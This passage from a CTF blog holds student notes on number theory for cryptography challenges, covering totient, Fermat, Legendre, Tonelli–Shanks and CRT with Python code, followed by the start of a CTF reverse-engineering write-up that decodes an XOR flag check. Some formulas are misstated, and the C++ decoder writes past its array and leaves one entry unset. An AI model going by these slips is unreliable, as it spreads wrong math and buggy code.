<p>Based on <strong>Phi is a multiplicative function</strong> and
<strong>Value of phi for a prime power argument</strong></p>
<p>IF <span class="math inline">\(p\)</span> is a prime and <span
class="math inline">\(k\ge 1\)</span> then: <span
class="math display">\[
\varphi(p^k)=p^k-p^{k-1}=p^{k-1}(p-1)=p^k(1-\frac{1}{p}) \]</span></p>
<blockquote>
<p>Proof: Since <span class="math inline">\(p\)</span> is a prime
number, the only possible values of <span class="math inline">\(gcd
(p^k,m)\)</span>are <span class="math inline">\(1, p, p^2, ...,
p^k\)</span>, and the only way to have <span
class="math inline">\(gcd(p^k, m) &gt; 1\)</span> is if <em>m</em> is a
multiple of <em>p</em>, that is, <span class="math inline">\(m \in {p,
2p, 3p, ..., p^{k − 1}p = p^k}\)</span>, and there are <span
class="math inline">\(p^k − 1\)</span> such multiples not greater than
<span class="math inline">\(p^k\)</span>. Therefore, the other <span
class="math inline">\(p^k − p^k − 1\)</span> numbers are all relatively
prime to <span class="math inline">\(p^k\)</span>.</p>
</blockquote>
<h2 id="fermats-little-theorem">Fermat's Little Theorem</h2>
<p>If <span class="math inline">\(p\)</span> is a prime number,then for
any integer <span class="math inline">\(a\)</span>, the number <span
class="math inline">\(a^p-a\)</span> is an integer multiple of p. In the
notation of modular arithmetic, this is expressed as: <span
class="math display">\[ a^p\equiv a\mod p \]</span></p>
<p>If <span class="math inline">\(a\)</span> is not divisible by <span
class="math inline">\(p\)</span>, that is if <span
class="math inline">\(a\)</span> is coprime to <span
class="math inline">\(p\)</span>, Fermat's little theorem is equivalent
to the statement that <span class="math inline">\(a^{p-1}-1\)</span> is
an integer multiple of <span class="math inline">\(p\)</span>, or in
symbols: <span class="math display">\[ a^{p-1}\equiv 1 \mod p
\]</span></p>
<h3 id="eulers-theorem">Euler's Theorem</h3>
<p>Let <span class="math inline">\(n\)</span> be a <strong>positive
integer,</strong> and let <em>a</em> be an integer that is relatively
prime to <em>n</em>. Then <span class="math display">\[
a^{\varphi(n)}\equiv 1 \mod n \]</span> where <em>ϕ</em>(<em>n</em>) is
Euler's totient function.</p>
<h2 id="modular-multiplicative-inverse">Modular multiplicative
inverse</h2>
<p>a modular multiplicative inverse of an integer <em>a</em> is an
integer <em>x</em> such that <span class="math display">\[ ax\equiv 1
\mod m \]</span> which is the shorthand way of writing that<span
class="math inline">\(\space \space (ax-1)|m\)</span>.</p>
<p><span class="math inline">\(x\mod m\)</span> exists if and only
if<span class="math inline">\(\space \space gcd(a,m)=1\)</span>,and<span
class="math inline">\(xm\)</span>is unique.</p>
<p>There is only one integer that<span class="math inline">\(\space 0\le
x\le m-1\)</span>.</p>
<p>Not every element of a complete residue system modulo <em>m</em> has
a modular multiplicative inverse. After removing the elements of a
complete residue system that are not relatively prime to <em>m</em>,
what is left is called a areduced residue system, all of whose elements
have modular multiplicative inverse. The number of element in a reduced
residue system is<span class="math inline">\(\space \space
\varphi(m)\)</span>.</p>
<h2 id="quadratic-residues">Quadratic Residues</h2>
<p>An integer <span class="math inline">\(q\)</span> is called a
quadratic residue modulo <span class="math inline">\(n\)</span> if it is
congruent to a perfect square modulo <span
class="math inline">\(n\)</span> <span class="math display">\[ x^2\equiv
q\mod n \]</span> Otherwise,<span class="math inline">\(q\)</span> is
called a quadratic non-residue modulo n.</p>
<h3 id="eulers-criterion">Euler's criterion</h3>
<p>A formula for determining <strong>whether an integer is a quadratic
residue modulo a prime</strong>. Precisely,</p>
<p>Let <span class="math inline">\(p\)</span> be an odd prime and <span
class="math inline">\(a\)</span> be an integer coprime to <span
class="math inline">\(p\)</span>. Then <span class="math display">\[
(\frac{a}{p})=\begin{cases}\ 1 \mod p\quad &amp;&amp;if \space there
\space is \space an \space integer \space x \space such \space that
\space x^2\equiv a \mod p\\ -1 \mod p &amp;&amp;if \space there \space
is \space no \space such \space integer \space \end{cases} \]</span>
<strong>Proof</strong>(may not important):</p>
<p>Because the modulus is prime, Lagrange's theorem applies: a
polynomial of degree <span class="math inline">\(k\)</span> can only
have at most <span class="math inline">\(k\)</span> roots. In
particular, <span class="math inline">\(x^2\equiv a \mod p\)</span> has
at most 2 solutions for each <span class="math inline">\(a\)</span>.</p>
<p>This implies that besides 0 there are at least <span
class="math inline">\(\frac{p-1}{2}\)</span> distinct quadratic residues
modulo <span class="math inline">\(p\)</span>: each of the <span
class="math inline">\(p-1\)</span> possible values of <span
class="math inline">\(x\)</span> can only be accompanied by one other to
give the same residue.</p>
<p>In fact, <span class="math inline">\((p-x)^2\equiv x^2 \mod
p\)</span>.This is because <span class="math inline">\((p-x)^2\equiv p^2
-2px+x^2\equiv x^2 \mod p\)</span>. So the <span
class="math inline">\(\frac{p-1}{2}\)</span> distinct quadratic residues
are: <span class="math inline">\(1^2,2^2,\cdots,(\frac{p-1}{2})^2\mod
p\)</span>.</p>
<p>As <span class="math inline">\(a\)</span> is coprime to <span
class="math inline">\(p\)</span> ,Fermat's little theorem says that:
<span class="math display">\[ a^{p-1}\equiv 1\mod p \]</span> which can
be written as <span class="math display">\[
(a^{\frac{p-1}{2}}-1)(a^{\frac{p-1}{2}}+1)\equiv 0\mod p \]</span> Since
the integers mod <span class="math inline">\(p\)</span> from a field,
for each <span class="math inline">\(a\)</span>, one or the other of
these factors must be zero.</p>
<p>Now if <span class="math inline">\(a\)</span> is a quadratic residue,
<span class="math inline">\(a\equiv x^2\)</span>, <span
class="math display">\[ a^{\frac{p-1}{2}}\equiv
(x^2)^{\frac{p-1}{2}}\equiv x^{p-1}\equiv 1\mod p \]</span> So every
quadratic residue (mod <span class="math inline">\(p\)</span>) makes the
first factor zero.</p>
<p>Applying Lagrange's theorem again, we note that there can be
<strong>no more than</strong> <span
class="math inline">\(\frac{p-1}{2}\)</span> values of <span
class="math inline">\(a\)</span> that make the first factor zero. But as
we noted at the beginning, there are <strong>at least</strong> <span
class="math inline">\(\frac{p-1}{2}\)</span> distinct quadratic residues
(mod p) (besides 0).Therefore, they are <strong>precisely the residue
classes</strong> that make the first factor zero. The other <span
class="math inline">\(\frac{p-1}{2}\)</span> residue classes, the
non-residues, must make the second factor zero, or they would not
satisfy Fermat's little theorem.</p>
<h3 id="legendre-symbol">Legendre Symbol</h3>
<p><strong>Legendre symbol</strong> is a multiplicative function with
values 1, −1, 0 that is a quadratic character modulo of an odd prime
number <span class="math inline">\(p\)</span>: its value at a (nonzero)
quadratic residue mod <span class="math inline">\(p\)</span> is 1 and at
a non-quadratic residue (<em>non-residue</em>) is −1. Its value at zero
is 0.</p>
<p><strong>Definition:</strong></p>
<p>Let <span class="math inline">\(p\)</span> be an odd prime number. An
integer <span class="math inline">\(a\)</span> is a quadratic residue
modulo <span class="math inline">\(p\)</span> if it is congruent to a
perfect square modulo <span class="math inline">\(p\)</span> and is a
quadratic non-residue modulo <span class="math inline">\(p\)</span>
otherwise. The <strong>Legendre symbol</strong> is a function of <span
class="math inline">\(a\)</span> and <span
class="math inline">\(p\)</span> defined as: <span
class="math display">\[ (\frac{a}{p})=\begin{cases}\ 1 \quad
&amp;&amp;if \space a \space is \space quadratic \space residue \space
modulo \space p \space and \space a\not\equiv 0 \mod p\\ -1 \quad
&amp;&amp;if \space a \space is \space quadratic \space nonresidue
\space modulo \space p \space \\ 0 \quad &amp;&amp;if\space a\equiv 0
\mod p \end{cases} \]</span></p>
<p>Explicit Formula: <span class="math display">\[ (\frac{a}{p})\equiv
a^{\frac{p-1}{2}}\mod p \quad and \quad (\frac{a}{p})\in\{-1,0,1\}
\]</span></p>
<p><strong>Properties of the Legendre symbol</strong></p>
<ul>
<li><p>Given a generator <span class="math inline">\(g\in \mathbb F_p^*
,if \space x=g^r\)</span>,then <span class="math inline">\(x\)</span> is
a quadratic residue if and only if <span
class="math inline">\(r\)</span> is <strong>even</strong>. This show
that <strong>half of</strong> the nonzero elements in <span
class="math inline">\(\mathbb F^* _p\)</span> are quadratic
residues.</p></li>
<li><p>(<strong>Important</strong>)If <span
class="math inline">\(p\equiv 3 \mod 4\)</span> then the fact that</p>
<p><span
class="math inline">\(\frac{p+1}{4}+\frac{p+1}{4}=\frac{(p-1)+2}{2}\)</span>
givens us that <span class="math inline">\(a=x^{\frac{p+1}{4}}\)</span>
is the square root of the quadratic residue <span
class="math inline">\(x\)</span>.</p></li>
<li><p>The Legendre symbol is periodic in its first( or top) argument
:if <span class="math inline">\(a\equiv b\mod p\)</span>,then <span
class="math display">\[ (\frac{a}{p})=(\frac{b}{p}) \]</span></p></li>
<li><p>The Legendre symbol is a completely multiplicative function of
its top argument: <span class="math display">\[
(\frac{ab}{p})=(\frac{a}{p})(\frac{b}{p}) \]</span> make compute an easy
job.</p></li>
<li><p>In particular, the product of two numbers that are both quadratic
residues or quadratic non-residues modulo <span
class="math inline">\(p\)</span> is a residue, whereas the product a
residue with a non-residue is an non-residue.</p>
<p>Quadratic Residue * Quadratic Residue = Quadratic Residue Quadratic
Residue * Quadratic Non-residue = Quadratic Non-residue Quadratic
Non-residue * Quadratic Non-residue = Quadratic Residue</p>
<p>A special case is the Legendre symbol of a square:</p></li>
</ul>
<p><span class="math display">\[ (\frac{x^2}{p})=\begin{cases} 1
&amp;&amp;\quad if\space p \not\mid x\\ 0 &amp;&amp;\quad if \space
p\mid x \end{cases} \]</span></p>
<h3 id="tonellishanks-algorithm">Tonelli–Shanks algorithm</h3>
<p>(maybe you can block this part, you just need to know its
function,and when to use it)</p>
<p>The <strong>Tonelli–Shanks algorithm</strong> is used in modular
arithmetic to solve for <span class="math inline">\(r\)</span> in a
congruence of the form <span class="math inline">\(r^2 \equiv n \mod
p\)</span>, where <span class="math inline">\(p\)</span> is a prime:
that is, to find a square root of <span class="math inline">\(n\)</span>
modulo <span class="math inline">\(p\)</span>.</p>
<p>Tonelli–Shanks cannot be used for composite moduli: finding square
roots modulo composite numbers is a computational problem equivalent to
integer factorization.</p>
<p><strong>Algorithm</strong>:</p>
<p>Inputs:</p>
<ul>
<li><span class="math inline">\(p\)</span> ,a prime</li>
<li><span class="math inline">\(n\)</span>, an element of <span
class="math inline">\(\mathbb Z/p\mathbb Z\)</span> such that solutions
to the congruence <span class="math inline">\(r^2=n\)</span> exist;when
this is so we say that <span class="math inline">\(n\)</span> is
quadratic residue mod p</li>
</ul>
<p>Outputs:</p>
<ul>
<li><span class="math inline">\(r\)</span> in <span
class="math inline">\(\mathbb Z /p\mathbb Z\)</span> such that <span
class="math inline">\(r^2=n\)</span></li>
</ul>
<p>Algorithm:</p>
<ol type="1">
<li><p>By factoring out powers of 2, find Q and S such that <span
class="math inline">\(p-1=Q2^S\)</span> with Q odd</p>
<p>If S=1, output <span class="math inline">\(r=\pm
a^{\frac{p+1}{4}}\)</span> Time spend <span
class="math inline">\(O(ln(p)^3)\)</span></p></li>
<li><p>Search for a <span class="math inline">\(z\)</span> in <span
class="math inline">\(\mathbb Z/p\mathbb Z\)</span> which is a quadratic
non-residue</p>
<ul>
<li>Half of the elements in the set will be quadratic non-residues</li>
<li>Candidates can be tested with Euler's criterion</li>
<li>So we can randomly choose integer <span class="math inline">\(u \in
\mathbb Z/p\mathbb Z\)</span> , until we find a <span
class="math inline">\(z\)</span> such that <span
class="math inline">\((\frac{z}{p})=-1\)</span>, the time spend is <span
class="math inline">\(O(ln(p)^2)\)</span></li>
</ul></li>
<li><p>Let <span class="math display">\[ M\leftarrow S\\ c\leftarrow
z^Q\\ t \leftarrow n^Q\\ R \leftarrow n^{\frac{Q+1}{2}}
\]</span></p></li>
<li><p>Loop:</p>
<ul>
<li>If <span class="math inline">\(t=0\)</span>, return <span
class="math inline">\(r=0\)</span></li>
<li>If <span class="math inline">\(t=1\)</span> ,return <span
class="math inline">\(r=R\)</span></li>
<li>Otherwise, use repeated squaring to find the least <span
class="math inline">\(i,0&lt;i&lt;M\)</span> such that <span
class="math inline">\(t^{2^i}=1\)</span></li>
<li>Let <span class="math display">\[ b \leftarrow c^{2^{M-i-1}}\\ M
\leftarrow i\\ c \leftarrow b^2\\ t \leftarrow tb^2\\ R \leftarrow Rb
\]</span></li>
</ul></li>
</ol>
<p>Once you have solved the congruence with <span
class="math inline">\(r\)</span> the second solution is <span
class="math inline">\(-r\mod p\)</span> . If the least <span
class="math inline">\(i\)</span> such that <span
class="math inline">\(t^{2^i}=1\)</span> is M,then no solution to the
congruence exists , i.e. <span class="math inline">\(n\)</span> is not a
quadratic residue.</p>
<p>Example:</p>
<p>Solving the congruence <span class="math inline">\(r^2\equiv 5\mod
41\)</span>, 41 is prime as required and <span
class="math inline">\(41\equiv 1\mod 4\)</span>, 5 is quadratic residue
by Euler's criterion: <span
class="math inline">\(5^\frac{41-1}{2}=5^{20}\equiv 1\mod p\)</span></p>
<ol type="1">
<li><span class="math inline">\(p-1=40=5\cdot 2^3\)</span> so <span
class="math inline">\(Q\leftarrow5,S\leftarrow 3\)</span></li>
<li>Find a value for z:
<ul>
<li><span class="math inline">\(2^\frac{41-1}{2}=1\)</span>, so 2 is a
quadratic residue by Euler's criterion</li>
<li><span class="math inline">\(3^\frac{41-1}{2}=40=-1\)</span>, so 3 is
a quadratic non-residue: set<span class="math inline">\(z
\leftarrow3\)</span></li>
</ul></li>
<li>Let:
<ul>
<li><span class="math inline">\(M\leftarrow S=3\)</span></li>
<li><span class="math inline">\(c\leftarrow z^Q=3^5=38\)</span></li>
<li><span class="math inline">\(t\leftarrow n^Q=5^5=9\)</span></li>
<li><span class="math inline">\(R\leftarrow
n^\frac{Q+1}{2}=5^\frac{5+1}{2}=2\)</span></li>
</ul></li>
<li>Loop:
<ul>
<li>First iteration:
<ul>
<li><span class="math inline">\(t\neq 1\)</span>, so we're not
finished</li>
<li><span class="math inline">\(t^{2^1}=40.t^{2^2}=1\)</span> ,so <span
class="math inline">\(i\leftarrow2\)</span></li>
<li><span class="math inline">\(b\leftarrow
c^{2^{M-i-1}}=38^{2^{3-2-1}}=38\)</span></li>
<li><span class="math inline">\(M\leftarrow i=2\)</span></li>
<li><span class="math inline">\(c\leftarrow b^2=38^2=9\)</span></li>
<li><span class="math inline">\(t\leftarrow tb^2=9\cdot
9=40\)</span></li>
<li><span class="math inline">\(R\leftarrow Rb=2\cdot
38=35\)</span></li>
</ul></li>
<li>Second iteration:
<ul>
<li><span class="math inline">\(t\neq 1\)</span>, so we're still not
finished</li>
<li><span class="math inline">\(t^{2^1}=1\)</span>, so <span
class="math inline">\(i\leftarrow1\)</span></li>
<li><span class="math inline">\(b\leftarrow
c^{2^{M-i-1}}=9^{2^{2-1-1}}=9\)</span></li>
<li><span class="math inline">\(M\leftarrow i=1\)</span></li>
<li><span class="math inline">\(c \leftarrow b^2=9^2=40\)</span></li>
<li><span class="math inline">\(t\leftarrow tb^2=40\cdot 40
=1\)</span></li>
<li><span class="math inline">\(R \leftarrow Rb=35 \cdot
9=28\)</span></li>
</ul></li>
<li>Third iteration:
<ul>
<li><span class="math inline">\(t=1\)</span>, and we are finished;return
<span class="math inline">\(r=R=28\)</span></li>
</ul></li>
</ul></li>
</ol>
<p>Algorithm implementation</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">8479994658316772151941616510097127087554541274812435112009425778595495359700244470400642403747058566807127814165396640215844192327900454116257979487432016769329970767046735091249898678088061634796559556704959846424131820416048436501387617211770124292793308079214153179977624440438616958575058361193975686620046439877308339989295604537867493683872778843921771307305602776398786978353866231661453376056771972069776398999013769588936194859344941268223184197231368887060609212875507518936172060702209557124430477137421847130682601666968691651447236917018634902407704797328509461854842432015009878011354022108661461024768</span></span><br><span class="line">p = <span class="number">30531851861994333252675935111487950694414332763909083514133769861350960895076504687261369815735742549428789138300843082086550059082835141454526618160634109969195486322015775943030060449557090064811940139431735209185996454739163555910726493597222646855506445602953689527405362207926990442391705014604777038685880527537489845359101552442292804398472642356609304810680731556542002301547846635101455995732584071355903010856718680732337369128498655255277003643669031694516851390505923416710601212618443109844041514942401969629158975457079026906304328749039997262960301209158175920051890620947063936347307238412281568760161</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Legendre</span>(<span class="params">a,p</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(a,(p-<span class="number">1</span>)//<span class="number">2</span>,p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Tonelli</span>(<span class="params">n,p</span>):</span><br><span class="line">    <span class="keyword">assert</span> Legendre(n,p)==<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> p%<span class="number">4</span>==<span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(n,(p+<span class="number">1</span>)//<span class="number">4</span>,p)</span><br><span class="line">    q=p-<span class="number">1</span></span><br><span class="line">    s=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> q%<span class="number">2</span> ==<span class="number">0</span>:</span><br><span class="line">        q = q// <span class="number">2</span></span><br><span class="line">        s += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,p):</span><br><span class="line">        <span class="keyword">if</span> Legendre(z,p)==p-<span class="number">1</span>:</span><br><span class="line">            c=<span class="built_in">pow</span>(z,q,p)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    r = <span class="built_in">pow</span>(n,(q+<span class="number">1</span>)//<span class="number">2</span>,p)</span><br><span class="line">    t = <span class="built_in">pow</span>(n,q,p)</span><br><span class="line">    m=s</span><br><span class="line">    <span class="keyword">if</span> t%p ==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> t%p !=<span class="number">1</span>:</span><br><span class="line">            temp=<span class="built_in">pow</span>(t,<span class="number">2</span>**(i+<span class="number">1</span>),p)</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> temp%p==<span class="number">1</span>:</span><br><span class="line">                b=<span class="built_in">pow</span>(c,<span class="number">2</span>**(m-i-<span class="number">1</span>),p)</span><br><span class="line">                r=(r*b)%p</span><br><span class="line">                c=(b*b)%p</span><br><span class="line">                t=(t*c)%p</span><br><span class="line">                m=i</span><br><span class="line">                i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"><span class="built_in">print</span>(Tonelli(a,p))</span><br></pre></td></tr></table></figure>
<h2 id="中国剩余定理-chinese-remainder-theorem">中国剩余定理 (Chinese
remainder theorem)</h2>
<p>(中国剩余定理肯定是要用中文的)</p>
<p>关于一元线性同余方程组的定理，说明了一元线性同余方程组有解的准则以及求解方法.</p>
<p>对于以下一元线性方程组 <span class="math display">\[ \begin{cases} x
\equiv a_1 \mod m_1\\ x\equiv a_2 \mod m_2\\ \vdots\\ x\equiv a_n \mod
m_n \end{cases} \]</span> 且 <span
class="math inline">\(m_1,m_2,\cdots,m_n\)</span>
其中任意两数互质，则对任意的整数 <span
class="math inline">\(a_1,a_2,\cdots,a_n\)</span>,
方程组有解，并且通解可以用如下方式构造得到:</p>
<ol type="1">
<li>设 <span class="math inline">\(M=m_1\times m_2\times \cdots \times
m_n=\prod _{i=1}^n m_i\)</span> 是整数 <span
class="math inline">\(m_1,m_2,\cdots,m_n\)</span> 的乘积，并设 <span
class="math inline">\(M_i=M/m_i,\forall i\in\{1,2,\cdots,n\}\)</span>,
即 <span class="math inline">\(M_i\)</span> 是除了 <span
class="math inline">\(m_i\)</span> 以外的 <span
class="math inline">\(n-1\)</span> 个整数的乘积.</li>
<li>设 $t_i=M_i^{-1} 为 $<span class="math inline">\(M_i\)</span> 模
<span class="math inline">\(m_i\)</span> 的数论倒数:<span
class="math inline">\(t_iM_i\equiv 1\mod m_i,\forall i\in
\{1,2,\cdots,n\}\)</span></li>
<li>方程组的通解形式为:<span
class="math inline">\(x=a_1t_1M_1+a_2t_2M_2+\cdots+a_nt_nM_n+kM=kM+\sum_{i=1}^n
a_it_iM_i,k\in \mathbb Z\)</span>. 在模 <span
class="math inline">\(M\)</span> 的意义下，方程组只有一个解 <span
class="math inline">\(\sum_{i=1}^n a_it_iM_i\)</span></li>
</ol>
<p>脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">a=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br><span class="line">m=[<span class="number">5</span>,<span class="number">11</span>,<span class="number">17</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">return</span> gcd(b,a%b) <span class="keyword">if</span> b <span class="keyword">else</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Crt</span>(<span class="params">a,m</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,<span class="built_in">len</span>(m)):</span><br><span class="line">            <span class="keyword">if</span> gcd(m[i],m[j])!=<span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;not coprime&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    M=<span class="number">1</span></span><br><span class="line">    <span class="comment">#Calculate the product of m</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        M=M*i</span><br><span class="line">    Mm=[]</span><br><span class="line">    <span class="comment">#Calculate each M//m</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        Mm.append(M//i)</span><br><span class="line">    t=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        t.append(gmpy2.invert(Mm[i],m[i]))</span><br><span class="line">    <span class="comment">#Calculate the answer</span></span><br><span class="line">    x=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        <span class="built_in">print</span>(Mm[i]*t[i]*a[i])</span><br><span class="line">        x+=Mm[i]*t[i]*a[i]</span><br><span class="line">    x=x%M</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Crt(a,m))</span><br></pre></td></tr></table></figure>
<p>实现 2:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span>  <span class="title function_">merge</span>(<span class="params">a1,n1,a2,n2</span>):</span><br><span class="line">    d = math.gcd(n1,n2)</span><br><span class="line">    c = a2-a1</span><br><span class="line">    <span class="keyword">if</span> c%d!=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    c = (c%n2+n2)%n2</span><br><span class="line">    c = c//d</span><br><span class="line">    n1 = n1//d</span><br><span class="line">    n2 = n2//d</span><br><span class="line">    c *= gmpy2.invert(n1,n2)</span><br><span class="line">    c %= n2</span><br><span class="line">    c *= n1*d</span><br><span class="line">    c += a1</span><br><span class="line">    <span class="keyword">global</span> n3</span><br><span class="line">    <span class="keyword">global</span> a3</span><br><span class="line">    n3 = n1*n2*d</span><br><span class="line">    a3 = (c%n3+n3)%n3</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exCRT</span>(<span class="params">a,n</span>):</span><br><span class="line">    a1=a[<span class="number">0</span>]</span><br><span class="line">    n1=n[<span class="number">0</span>]</span><br><span class="line">    le= <span class="built_in">len</span>(a)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,le):</span><br><span class="line">        a2 = a[i]</span><br><span class="line">        n2=n[i]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> merge(a1,n1,a2,n2):</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        a1 = a3</span><br><span class="line">        n1 = n3</span><br><span class="line">    <span class="keyword">global</span> mod</span><br><span class="line">    mod=n1</span><br><span class="line">    <span class="keyword">return</span> (a1%n1+n1)%n1</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exCRT_getequation</span>(<span class="params">a,n</span>):</span><br><span class="line">    a1=a[<span class="number">0</span>]</span><br><span class="line">    n1=n[<span class="number">0</span>]</span><br><span class="line">    le= <span class="built_in">len</span>(a)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,le):</span><br><span class="line">        a2 = a[i]</span><br><span class="line">        n2=n[i]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> merge(a1,n1,a2,n2):</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        a1 = a3</span><br><span class="line">        n1 = n3</span><br><span class="line">    <span class="keyword">return</span> (a1,n1)</span><br><span class="line"><span class="comment">#a为余数列表</span></span><br><span class="line"><span class="comment">#n为模数列表</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-For-TSCTF-J</title>
    <url>/archives/7ad6ebfa.html</url>
    <content><![CDATA[<p>第一次打这种短时间的比赛，还是校内赛，<del>多少有点累</del></p>
<p>（现在已经习惯了）</p>
<p>但好在结果还是令人满意的，感谢校内的出题人提供了一次优秀的<del>拷打</del>比赛
<span id="more"></span> # Reverse</p>
<h2 id="baby_xor">baby_xor</h2>
<p>Re的签到题</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20221017094519187.png" /></p>
<p>string窗口找到</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20221017094543101.png" /></p>
<p>一大串异或，逆回来即可</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> data[<span class="number">40</span>];</span><br><span class="line">    data[<span class="number">0</span>] = <span class="number">18</span>;</span><br><span class="line">    data[<span class="number">1</span>] = <span class="number">20</span>;</span><br><span class="line">    data[<span class="number">2</span>] = <span class="number">7</span>;</span><br><span class="line">    data[<span class="number">3</span>] = <span class="number">17</span>;</span><br><span class="line">    data[<span class="number">4</span>] = <span class="number">4</span>;</span><br><span class="line">    data[<span class="number">5</span>] = <span class="number">110</span>;</span><br><span class="line">    data[<span class="number">6</span>] = <span class="number">10</span>;</span><br><span class="line">    data[<span class="number">7</span>] = <span class="number">58</span>;</span><br><span class="line">    data[<span class="number">8</span>] = <span class="number">25</span>;</span><br><span class="line">    data[<span class="number">9</span>] = <span class="number">124</span>;</span><br><span class="line">    data[<span class="number">10</span>] = <span class="number">32</span>;</span><br><span class="line">    data[<span class="number">11</span>] = <span class="number">14</span>;</span><br><span class="line">    data[<span class="number">12</span>] = <span class="number">122</span>;</span><br><span class="line">    data[<span class="number">13</span>] = <span class="number">6</span>;</span><br><span class="line">    data[<span class="number">14</span>] = <span class="number">123</span>;</span><br><span class="line">    data[<span class="number">15</span>] = <span class="number">22</span>;</span><br><span class="line">    data[<span class="number">16</span>] = <span class="number">100</span>;</span><br><span class="line">    data[<span class="number">17</span>] = <span class="number">8</span>;</span><br><span class="line">    data[<span class="number">18</span>] = <span class="number">6</span>;</span><br><span class="line">    data[<span class="number">19</span>] = <span class="number">48</span>;</span><br><span class="line">    data[<span class="number">20</span>] = <span class="number">4</span>;</span><br><span class="line">    data[<span class="number">21</span>] = <span class="number">22</span>;</span><br><span class="line">    data[<span class="number">22</span>] = <span class="number">34</span>;</span><br><span class="line">    data[<span class="number">23</span>] = <span class="number">117</span>;</span><br><span class="line">    data[<span class="number">24</span>] = <span class="number">27</span>;</span><br><span class="line">    data[<span class="number">26</span>] = <span class="number">36</span>;</span><br><span class="line">    data[<span class="number">27</span>] = <span class="number">18</span>;</span><br><span class="line">    data[<span class="number">28</span>] = <span class="number">40</span>;</span><br><span class="line">    data[<span class="number">29</span>] = <span class="number">4</span>;</span><br><span class="line">    data[<span class="number">30</span>] = <span class="number">105</span>;</span><br><span class="line">    data[<span class="number">31</span>] = <span class="number">42</span>;</span><br><span class="line">    data[<span class="number">32</span>] = <span class="number">57</span>;</span><br><span class="line">    data[<span class="number">33</span>] = <span class="number">67</span>;</span><br><span class="line">    data[<span class="number">34</span>] = <span class="number">43</span>;</span><br><span class="line">    data[<span class="number">35</span>] = <span class="number">85</span>;</span><br><span class="line">    data[<span class="number">36</span>] = <span class="number">13</span>;</span><br><span class="line">    data[<span class="number">37</span>] = <span class="number">60</span>;</span><br><span class="line">    data[<span class="number">38</span>] = <span class="number">5</span>;</span><br><span class="line">    data[<span class="number">39</span>] = <span class="number">83</span>;</span><br><span class="line">    data[<span class="number">40</span>] = <span class="number">19</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">40</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        